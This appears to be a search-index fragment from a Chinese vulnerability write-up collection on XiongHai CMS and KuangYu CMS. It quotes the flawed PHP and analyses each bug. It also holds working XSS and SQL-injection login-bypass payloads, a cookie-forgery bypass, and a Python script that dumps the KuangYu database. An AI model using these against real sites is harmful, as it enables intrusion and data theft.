https://xz.aliyun.com/t/7629","title":"\u53cd\u5c04\u578bXSS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#_1","text":"\u53cd\u5c04\u578bXSS \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/contact.php \u7b2c12~15\u884c $page=addslashes($_GET['page']); if ($page<>\"\"){ if ($page<>1){ $pages=\"\u7b2c\".$page.\"\u9875 - \"; \u7ecf\u8fc7\u4e00\u6b21addslashes\u51fd\u6570\u5904\u7406\u5c31\u76f4\u63a5\u5e26\u5165\u9875\u9762\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#_2","text":"\u6211\u4eec\u8bbf\u95ee\u7f51\u5740\u7684\u8054\u7cfb\u529f\u80fd\uff0c\u627e\u5230\u4e86\u4ee3\u7801\u5bf9\u4e8e\u7684page\u53c2\u6570\uff0c\u5176\u5b9e\u5c31\u662f\u7559\u8a00\u5217\u8868\u7684\u9875\u6570\u3002 \u6211\u4eec\u5c1d\u8bd5\u63d2\u5165\u4e00\u4e2a\u7b80\u5355XSS payload page=<img src=x onerror=alert(/xss/);> \u6f0f\u6d1e\u5229\u7528\u6210\u529f\u3002","title":"\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#_3","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u6f0f\u6d1e\u4f4d\u7f6e\uff1aadmin/files/login.php <?php ob_start(); require '../inc/conn.php'; $login=$_POST['login']; $user=$_POST['user']; $password=$_POST['password']; $checkbox=$_POST['checkbox']; if ($login<>\"\"){ $query = \"SELECT * FROM manage WHERE user='$user'\"; $result = mysql_query($query) or die('SQL\u8bed\u53e5\u6709\u8bef\uff1a'.mysql_error()); $users = mysql_fetch_array($result); if (!mysql_num_rows($result)) { echo \"<Script language=JavaScript>alert('\u62b1\u6b49\uff0c\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef\u3002');history.back();</Script>\"; exit; }else{ $passwords=$users['password']; if(md5($password)<>$passwords){ echo \"<Script language=JavaScript>alert('\u62b1\u6b49\uff0c\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef\u3002');history.back();</Script>\"; exit; } //\u5199\u5165\u767b\u5f55\u4fe1\u606f\u5e76\u8bb0\u4f4f30\u5929 if ($checkbox==1){ setcookie('user',$user,time()+3600*24*30,'/'); }else{ setcookie('user',$user,0,'/'); } echo \"<script>this.location='?r=index'</script>\"; exit; } exit; ob_end_flush(); } ?> \u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6709\u4e24\u4e2a\u70b9\uff1a 1.user\u672a\u7ecf\u8fc7\u8fc7\u6ee4\u76f4\u63a5\u62fc\u63a5\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u8be2 2.password\u7684md5\u5bf9\u6bd4\u53ef\u7ed5\u8fc7 payload: user:1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8# password:1 \u6b64\u5904md5(1)=c4ca4238a0b923820dcc509a6f75849b \u6211\u4eec\u8fdb\u5165\u540e\u53f0\uff0c\u5728\u8d26\u53f7\u4e00\u680f\u4e2d\u586b\u5165payload\uff0c\u5bc6\u7801\u8f93\u5165mad5\u52a0\u5bc6\u76841\u5373\u53ef\u6210\u529f\u767b\u5f55\u3002 \u6f0f\u6d1e\u5206\u6790 \u6211\u4eec\u767b\u5f55\u6211\u4eec\u7684mysql\u6570\u636e\u5e93\uff0c\u67e5\u8be2xhcms\u5e93\u4e0b\u7684manage\u8868 \u6211\u4eec\u4f7f\u7528\u8054\u5408\u67e5\u8be2\u7684\u65b9\u6cd5\uff0c\u53d1\u73b0\u7ed3\u679c\u5728\u6570\u636e\u5e93\u4e0b\u6dfb\u52a0\u4e00\u884c\u65b0\u7684\u53c2\u6570\uff0c\u800c\u6dfb\u52a0\u7684\u503c\u6211\u4eec\u662f\u53ef\u63a7\u7684\u3002 \u6240\u4ee5\u6211\u4eec\u7684payload\u5c31\u662f\u901a\u8fc7\u4f20\u5165\u65b0\u7684md5\u52a0\u5bc6\u540e\u7684password\uff0c\u4ece\u800c\u8fbe\u5230\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u76f4\u63a5\u767b\u5f55\u7684\u76ee\u7684\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7629","title":"\u540e\u53f0\u4e07\u80fd\u5bc6\u7801\u767b\u5f55"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/#_1","text":"\u6f0f\u6d1e\u4f4d\u7f6e\uff1aadmin/files/login.php <?php ob_start(); require '../inc/conn.php'; $login=$_POST['login']; $user=$_POST['user']; $password=$_POST['password']; $checkbox=$_POST['checkbox']; if ($login<>\"\"){ $query = \"SELECT * FROM manage WHERE user='$user'\"; $result = mysql_query($query) or die('SQL\u8bed\u53e5\u6709\u8bef\uff1a'.mysql_error()); $users = mysql_fetch_array($result); if (!mysql_num_rows($result)) { echo \"<Script language=JavaScript>alert('\u62b1\u6b49\uff0c\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef\u3002');history.back();</Script>\"; exit; }else{ $passwords=$users['password']; if(md5($password)<>$passwords){ echo \"<Script language=JavaScript>alert('\u62b1\u6b49\uff0c\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef\u3002');history.back();</Script>\"; exit; } //\u5199\u5165\u767b\u5f55\u4fe1\u606f\u5e76\u8bb0\u4f4f30\u5929 if ($checkbox==1){ setcookie('user',$user,time()+3600*24*30,'/'); }else{ setcookie('user',$user,0,'/'); } echo \"<script>this.location='?r=index'</script>\"; exit; } exit; ob_end_flush(); } ?> \u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6709\u4e24\u4e2a\u70b9\uff1a 1.user\u672a\u7ecf\u8fc7\u8fc7\u6ee4\u76f4\u63a5\u62fc\u63a5\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u8be2 2.password\u7684md5\u5bf9\u6bd4\u53ef\u7ed5\u8fc7 payload: user:1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8# password:1 \u6b64\u5904md5(1)=c4ca4238a0b923820dcc509a6f75849b \u6211\u4eec\u8fdb\u5165\u540e\u53f0\uff0c\u5728\u8d26\u53f7\u4e00\u680f\u4e2d\u586b\u5165payload\uff0c\u5bc6\u7801\u8f93\u5165mad5\u52a0\u5bc6\u76841\u5373\u53ef\u6210\u529f\u767b\u5f55\u3002 \u6f0f\u6d1e\u5206\u6790 \u6211\u4eec\u767b\u5f55\u6211\u4eec\u7684mysql\u6570\u636e\u5e93\uff0c\u67e5\u8be2xhcms\u5e93\u4e0b\u7684manage\u8868 \u6211\u4eec\u4f7f\u7528\u8054\u5408\u67e5\u8be2\u7684\u65b9\u6cd5\uff0c\u53d1\u73b0\u7ed3\u679c\u5728\u6570\u636e\u5e93\u4e0b\u6dfb\u52a0\u4e00\u884c\u65b0\u7684\u53c2\u6570\uff0c\u800c\u6dfb\u52a0\u7684\u503c\u6211\u4eec\u662f\u53ef\u63a7\u7684\u3002 \u6240\u4ee5\u6211\u4eec\u7684payload\u5c31\u662f\u901a\u8fc7\u4f20\u5165\u65b0\u7684md5\u52a0\u5bc6\u540e\u7684password\uff0c\u4ece\u800c\u8fbe\u5230\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u76f4\u63a5\u767b\u5f55\u7684\u76ee\u7684\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/#_2","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/content.php <div class=\"manageinfo\"> <ul> <div class=\"lou\">\u56de\u590d #<?php echo $pinglun['id']?> \u697c</div> <?php $query2 = \"SELECT * FROM manage\"; $resul2 = mysql_query($query2) or die('SQL\u8bed\u53e5\u6709\u8bef\uff1a'.mysql_error()); $manage2 = mysql_fetch_array($resul2); if ($manage2['img']==\"\"){ $touxiang=\"images/manage.jpg\"; } else{ $touxiang=$manage2['img']; } ?> <img src=\"<?php echo $touxiang?>\"> <strong><?php echo $manage2['name']?><span>\u8ba4\u8bc1\u7ad9\u957f</span></strong> <li>\u4f4d\u7f6e\uff1a<a><?php echo $pinglun['rip']?></a></li> <li>\u65f6\u95f4\uff1a<a><?php echo tranTime(strtotime($pinglun['rdate']))?></a></li> <li>\u6765\u81ea\uff1a<a><?php echo $pinglun['rshebei']?></a></li> </ul> </div> \u8fd9\u91cc\u662f\u4ece$pinglun\u8fd9\u4e2a\u53d8\u91cf\u4e2d\u53d6\u51fa\u5176\u4e2d\u7684\u4fe1\u606f\uff0c\u968f\u540e\u63d2\u5165\u5b58\u50a8\u4fe1\u606f\u7684interaction\u8868 \u5728/files/submit.php\u4e2d\u5c06content\u5185\u5bb9\u7ed9\u8fc7\u6ee4\u3002 $content=addslashes(strip_tags($content)); //\u8fc7\u6ee4HTML \u5728\u8bc4\u8bba\u5904\u53ef\u4ee5\u63d0\u4ea4\u6635\u79f0\u3001\u90ae\u7bb1\u3001\u7f51\u5740\u3001\u8bc4\u8bba\u5185\u5bb9\uff0c\u4f46\u662f\u663e\u793a\u8bc4\u8bba\u548c\u7559\u8a00\u7684\u5730\u65b9\u6709\u6635\u79f0\uff0c\u6240\u4ee5\u53ea\u6709\u6635\u79f0\u5904\u6709\u5b58\u50a8\u578bXSS\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7629","title":"\u5b58\u50a8\u578bXSS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#_1","text":"\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/content.php <div class=\"manageinfo\"> <ul> <div class=\"lou\">\u56de\u590d #<?php echo $pinglun['id']?> \u697c</div> <?php $query2 = \"SELECT * FROM manage\"; $resul2 = mysql_query($query2) or die('SQL\u8bed\u53e5\u6709\u8bef\uff1a'.mysql_error()); $manage2 = mysql_fetch_array($resul2); if ($manage2['img']==\"\"){ $touxiang=\"images/manage.jpg\"; } else{ $touxiang=$manage2['img']; } ?> <img src=\"<?php echo $touxiang?>\"> <strong><?php echo $manage2['name']?><span>\u8ba4\u8bc1\u7ad9\u957f</span></strong> <li>\u4f4d\u7f6e\uff1a<a><?php echo $pinglun['rip']?></a></li> <li>\u65f6\u95f4\uff1a<a><?php echo tranTime(strtotime($pinglun['rdate']))?></a></li> <li>\u6765\u81ea\uff1a<a><?php echo $pinglun['rshebei']?></a></li> </ul> </div> \u8fd9\u91cc\u662f\u4ece$pinglun\u8fd9\u4e2a\u53d8\u91cf\u4e2d\u53d6\u51fa\u5176\u4e2d\u7684\u4fe1\u606f\uff0c\u968f\u540e\u63d2\u5165\u5b58\u50a8\u4fe1\u606f\u7684interaction\u8868 \u5728/files/submit.php\u4e2d\u5c06content\u5185\u5bb9\u7ed9\u8fc7\u6ee4\u3002 $content=addslashes(strip_tags($content)); //\u8fc7\u6ee4HTML \u5728\u8bc4\u8bba\u5904\u53ef\u4ee5\u63d0\u4ea4\u6635\u79f0\u3001\u90ae\u7bb1\u3001\u7f51\u5740\u3001\u8bc4\u8bba\u5185\u5bb9\uff0c\u4f46\u662f\u663e\u793a\u8bc4\u8bba\u548c\u7559\u8a00\u7684\u5730\u65b9\u6709\u6635\u79f0\uff0c\u6240\u4ee5\u53ea\u6709\u6635\u79f0\u5904\u6709\u5b58\u50a8\u578bXSS\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#_2","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u6f0f\u6d1e\u4f4d\u7f6e\uff1a/install/index.php RIPS\u5ba1\u8ba1\u51fa\u73b0sql\u6ce8\u5165\uff0c\u8ddf\u8fdb\u6587\u4ef6\u6bd4\u5bf9\u5ba1\u8ba1\u7ed3\u679c\u3002 \u901a\u8bfb\u4ee3\u7801\u53d1\u73b0\u4ee3\u7801\u903b\u8f91\u5982\u4e0b\uff1a 1.\u68c0\u6d4b\u662f\u5426\u751f\u6210\u4e86InstallLock.txt\u6587\u4ef6 2.\u6267\u884csql\u8bed\u53e5 \u5ba1\u8ba1\u53d1\u73b0\u8fd9\u91ccsql\u8bed\u53e5\u786e\u5b9e\u6ca1\u6709\u7ecf\u8fc7\u8fc7\u6ee4\uff0c\u76f4\u63a5\u63d2\u5165update\u7684sql\u8bed\u53e5\uff0c\u5bfc\u81f4sql\u6ce8\u5165\u3002 \u6f0f\u6d1e\u6f14\u793a\uff1a payload: 1' extractvalue(1,concat(0x7e,(select @@version),0x7e))# 1.\u6839\u636e\u6e90\u7801\u53ef\u77e5\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5220\u9664\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684installLock.txt\u6587\u4ef6\uff08\u5982\u679c\u7f51\u7ad9\u4e0a\u5b58\u5728\u4e00\u4e2a\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff09 2.\u5220\u9664\u540e\u6211\u4eec\u91cd\u65b0\u8fdb\u5165\u5b89\u88c5\u754c\u9762\u3002 \u5728\u7ba1\u7406\u8d26\u53f7\u4e00\u680f\u8f93\u5165\u6211\u4eec\u7684payload\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u89c1\u7684\u62a5\u9519\u6ce8\u5165\u65b9\u6cd5\uff0c \u4e4b\u540e\u6211\u4eec\u63d0\u4ea4\uff1a \u53d1\u73b0\u5728\u4fee\u6539\u9519\u8bef\u4e00\u680f\u53d1\u73b0\u7206\u51fa\u6211\u4eec\u7684Mysql\u7248\u672c\uff0c\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7629","title":"\u5b89\u88c5\u6d41\u7a0b\u4e2d\u5b58\u5728SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/#_1","text":"\u6f0f\u6d1e\u4f4d\u7f6e\uff1a/install/index.php RIPS\u5ba1\u8ba1\u51fa\u73b0sql\u6ce8\u5165\uff0c\u8ddf\u8fdb\u6587\u4ef6\u6bd4\u5bf9\u5ba1\u8ba1\u7ed3\u679c\u3002 \u901a\u8bfb\u4ee3\u7801\u53d1\u73b0\u4ee3\u7801\u903b\u8f91\u5982\u4e0b\uff1a 1.\u68c0\u6d4b\u662f\u5426\u751f\u6210\u4e86InstallLock.txt\u6587\u4ef6 2.\u6267\u884csql\u8bed\u53e5 \u5ba1\u8ba1\u53d1\u73b0\u8fd9\u91ccsql\u8bed\u53e5\u786e\u5b9e\u6ca1\u6709\u7ecf\u8fc7\u8fc7\u6ee4\uff0c\u76f4\u63a5\u63d2\u5165update\u7684sql\u8bed\u53e5\uff0c\u5bfc\u81f4sql\u6ce8\u5165\u3002 \u6f0f\u6d1e\u6f14\u793a\uff1a payload: 1' extractvalue(1,concat(0x7e,(select @@version),0x7e))# 1.\u6839\u636e\u6e90\u7801\u53ef\u77e5\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5220\u9664\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684installLock.txt\u6587\u4ef6\uff08\u5982\u679c\u7f51\u7ad9\u4e0a\u5b58\u5728\u4e00\u4e2a\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff09 2.\u5220\u9664\u540e\u6211\u4eec\u91cd\u65b0\u8fdb\u5165\u5b89\u88c5\u754c\u9762\u3002 \u5728\u7ba1\u7406\u8d26\u53f7\u4e00\u680f\u8f93\u5165\u6211\u4eec\u7684payload\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u89c1\u7684\u62a5\u9519\u6ce8\u5165\u65b9\u6cd5\uff0c \u4e4b\u540e\u6211\u4eec\u63d0\u4ea4\uff1a \u53d1\u73b0\u5728\u4fee\u6539\u9519\u8bef\u4e00\u680f\u53d1\u73b0\u7206\u51fa\u6211\u4eec\u7684Mysql\u7248\u672c\uff0c\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/#_2","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u6f0f\u6d1e\u4f4d\u7f6e\uff1ainc/checklogin.php <?php $user=$_COOKIE['user']; if ($user==\"\"){ header(\"Location: ?r=login\"); exit; } ?> \u8be5\u5904\u7684\u4ee3\u7801\u903b\u8f91\u5b58\u5728\u95ee\u9898\uff0c\u76f4\u63a5\u4eceCOOKIE\u5904\u8d4b\u503c\u7ed9$user \u5982\u679c $user\u4e3a\u7a7a\u5c31\u8df3\u8f6c\u81f3\u767b\u5f55\u754c\u9762 \u53cd\u4e4b\u5982\u679c\u4e0d\u4e3a\u7a7a\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u56e0\u6b64\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u3002 \u6f0f\u6d1e\u5229\u7528\uff1a \u00b6 \u6211\u4eec\u9996\u5148\u4eceadmin\u4e2d\u8fdb\u5165\u4f7f\u7528\u4e4b\u524d\u7684\u8d26\u53f7\u767b\u5f55\u540e\u53f0\u3002\u7136\u540e\u627e\u5230\u4e00\u4e2a\u53d1\u5e03\u5185\u5bb9\u7684\u9875\u9762\uff1a\u53c2\u6570\u4e3a?r=newwz \u4e4b\u540e\u6211\u4eec\u9000\u51fa\u767b\u5f55\uff0c\u56de\u5230\u767b\u5f55\u754c\u9762\u3002\u67e5\u770b\u9875\u9762\u7684cookie \u53d1\u73b0\u5728cookie\u91cc\u786e\u5b9e\u6ca1\u6709user\u503c\uff0c\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u8df3\u8f6c\u521a\u624d\u767b\u5f55\u540e\u7684\u53d1\u5e03\u9875\u9762\uff0c\u53d1\u73b0\u4f1a\u81ea\u52a8\u8df3\u8f6c\u5230\u767b\u5f55\u754c\u9762\u3002 \u6839\u636e\u4ee3\u7801\u903b\u8f91\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5728cookie\u4e2d\u6dfb\u52a0\u4e00\u4e2auser\uff0c\u56e0\u4e3a\u4ee3\u7801\u6ca1\u6709\u5224\u65aduser\u7684\u5177\u4f53\u503c\uff0c\u6240\u4ee5\u586b\u5165\u4efb\u610f\u6570\u503c\u5373\u53ef\u3002 \u6211\u4eec\u5728\u5c1d\u8bd5\u8df3\u8f6c\u9875\u9762 \u53d1\u73b0\u6ca1\u6709\u767b\u5f55\uff0c\u6211\u4eec\u4e5f\u6210\u529f\u8fdb\u5165\u4e86\u540e\u53f0\u9875\u9762\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7629","title":"\u8d8a\u6743"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/#_1","text":"\u6f0f\u6d1e\u4f4d\u7f6e\uff1ainc/checklogin.php <?php $user=$_COOKIE['user']; if ($user==\"\"){ header(\"Location: ?r=login\"); exit; } ?> \u8be5\u5904\u7684\u4ee3\u7801\u903b\u8f91\u5b58\u5728\u95ee\u9898\uff0c\u76f4\u63a5\u4eceCOOKIE\u5904\u8d4b\u503c\u7ed9$user \u5982\u679c $user\u4e3a\u7a7a\u5c31\u8df3\u8f6c\u81f3\u767b\u5f55\u754c\u9762 \u53cd\u4e4b\u5982\u679c\u4e0d\u4e3a\u7a7a\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u56e0\u6b64\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/#_2","text":"\u6211\u4eec\u9996\u5148\u4eceadmin\u4e2d\u8fdb\u5165\u4f7f\u7528\u4e4b\u524d\u7684\u8d26\u53f7\u767b\u5f55\u540e\u53f0\u3002\u7136\u540e\u627e\u5230\u4e00\u4e2a\u53d1\u5e03\u5185\u5bb9\u7684\u9875\u9762\uff1a\u53c2\u6570\u4e3a?r=newwz \u4e4b\u540e\u6211\u4eec\u9000\u51fa\u767b\u5f55\uff0c\u56de\u5230\u767b\u5f55\u754c\u9762\u3002\u67e5\u770b\u9875\u9762\u7684cookie \u53d1\u73b0\u5728cookie\u91cc\u786e\u5b9e\u6ca1\u6709user\u503c\uff0c\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u8df3\u8f6c\u521a\u624d\u767b\u5f55\u540e\u7684\u53d1\u5e03\u9875\u9762\uff0c\u53d1\u73b0\u4f1a\u81ea\u52a8\u8df3\u8f6c\u5230\u767b\u5f55\u754c\u9762\u3002 \u6839\u636e\u4ee3\u7801\u903b\u8f91\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5728cookie\u4e2d\u6dfb\u52a0\u4e00\u4e2auser\uff0c\u56e0\u4e3a\u4ee3\u7801\u6ca1\u6709\u5224\u65aduser\u7684\u5177\u4f53\u503c\uff0c\u6240\u4ee5\u586b\u5165\u4efb\u610f\u6570\u503c\u5373\u53ef\u3002 \u6211\u4eec\u5728\u5c1d\u8bd5\u8df3\u8f6c\u9875\u9762 \u53d1\u73b0\u6ca1\u6709\u767b\u5f55\uff0c\u6211\u4eec\u4e5f\u6210\u529f\u8fdb\u5165\u4e86\u540e\u53f0\u9875\u9762\u3002","title":"\u6f0f\u6d1e\u5229\u7528\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/#_3","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u540e\u53f0\u53ef\u4ee5\u76f4\u63a5\u5907\u4efd\u6570\u636e\u5e93\uff0c\u5907\u4efd\u540e\u4e3a.sql.gz\u6587\u4ef6(\u53ef\u4ee5\u5728\u8bbe\u7f6e\u91cc\u66f4\u6539\u662f\u5426\u538b\u7f29)\uff0c\u6587\u4ef6\u540d\u4e3atime\u51fd\u6570\u751f\u6210\u7684\u65f6\u95f4\u6233\uff0c\u53ef\u76f4\u63a5\u7206\u7834\u8fdb\u884c\u4e0b\u8f7d\uff0c\u8fd9\u91cc\u5148\u9644\u4e0aexp # !/usr/bin/python3 # -*- coding:utf-8 -*- # author: Forthrglory import requests import time def getDatabase(url,username, password): session = requests.session() u = 'http://%s/admin/index/login.html' % (url) head = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' } data = { 'username': username, 'password': password, 'code': 1 } session.post(u, data, headers = head) u = 'http://%s/admin/database/export.html' % (url) data = { 'layTableCheckbox':'on', 'tables[0]':'ky_ad', 'tables[1]':'ky_addons', 'tables[2]':'ky_bookshelf', 'tables[3]':'ky_category', 'tables[4]':'ky_collect', 'tables[5]':'ky_comment', 'tables[6]':'ky_config', 'tables[7]':'ky_crontab', 'tables[8]':'ky_link', 'tables[9]':'ky_member', 'tables[10]':'ky_menu', 'tables[11]':'ky_news', 'tables[12]':'ky_novel', 'tables[13]':'ky_novel_chapter', 'tables[14]':'ky_route', 'tables[15]':'ky_slider', 'tables[16]':'ky_template', 'tables[17]':'ky_user', 'tables[18]':'ky_user_menu' } t = time.strftime(\"%Y%m%d-%H%M%S\", time.localtime()) session.post(u, data = data) for i in range(0, 19): u2 = 'http://%s/admin/database/export.html?id=%s&start=0' % (url, str(i)) session.get(u2) t = 'http://' + url + '/public/database/' + t + '-1.sql.gz' return t if __name__ == '__main__': u = '127.0.0.1' username = 'admin' password = 'admin' t = getDatabase(u, username, password) print(t) \u8fd0\u884c\u4ee3\u7801\uff0c\u5f97\u5230\u8def\u5f84(\u9ed8\u8ba4\u751f\u6210\u8def\u5f84\u4e3a/public/database/\uff0c\u53ef\u5728\u8bbe\u7f6e\u4e2d\u4fee\u6539) \u76f4\u63a5\u8bbf\u95ee\u4e0b\u8f7d \u53ef\u4ee5\u770b\u5230\u6240\u6709\u6570\u636e\u5e93\u4fe1\u606f\u5168\u5728\u4e86 https://xz.aliyun.com/t/7486","title":"\u540e\u53f0\u6570\u636e\u6cc4\u9732"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/#_1","text":"\u540e\u53f0\u53ef\u4ee5\u76f4\u63a5\u5907\u4efd\u6570\u636e\u5e93\uff0c\u5907\u4efd\u540e\u4e3a.sql.gz\u6587\u4ef6(\u53ef\u4ee5\u5728\u8bbe\u7f6e\u91cc\u66f4\u6539\u662f\u5426\u538b\u7f29)\uff0c\u6587\u4ef6\u540d\u4e3atime\u51fd\u6570\u751f\u6210\u7684\u65f6\u95f4\u6233\uff0c\u53ef\u76f4\u63a5\u7206\u7834\u8fdb\u884c\u4e0b\u8f7d\uff0c\u8fd9\u91cc\u5148\u9644\u4e0aexp # !/usr/bin/python3 # -*- coding:utf-8 -*- # author: Forthrglory import requests import time def getDatabase(url,username, password): session = requests.session() u = 'http://%s/admin/index/login.html' % (url) head = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' } data = { 'username': username, 'password': password, 'code': 1 } session.post(u, data, headers = head) u = 'http://%s/admin/database/export.html' % (url) data = { 'layTableCheckbox':'on', 'tables[0]':'ky_ad', 'tables[1]':'ky_addons', 'tables[2]':'ky_bookshelf', 'tables[3]':'ky_category', 'tables[4]':'ky_collect', 'tables[5]':'ky_comment', 'tables[6]':'ky_config', 'tables[7]':'ky_crontab', 'tables[8]':'ky_link', 'tables[9]':'ky_member', 'tables[10]':'ky_menu', 'tables[11]':'ky_news', 'tables[12]':'ky_novel', 'tables[13]':'ky_novel_chapter', 'tables[14]':'ky_route', 'tables[15]':'ky_slider', 'tables[16]':'ky_template', 'tables[17]':'ky_user', 'tables[18]':'ky_user_menu' } t = time.strftime(\"%Y%m%d-%H%M%S\", time.localtime()) session.post(u, data = data) for i in range(0, 19): u2 = 'http://%s/admin/database/export.html?id=%s&start=0' % (url, str(i)) session.get(u2) t = 'http://' + url + '/public/database/' + t + '-1.sql.gz' return t if __name__ == '__main__': u = '127.0.0.1' username = 'admin' password = 'admin' t = getDatabase(u, username, password) print(t) \u8fd0\u884c\u4ee3\u7801\uff0c\u5f97\u5230\u8def\u5f84(\u9ed8\u8ba4\u751f\u6210\u8def\u5f84\u4e3a/public/database/\uff0c\u53ef\u5728\u8bbe\u7f6e\u4e2d\u4fee\u6539) \u76f4\u63a5\u8bbf\u95ee\u4e0b\u8f7d 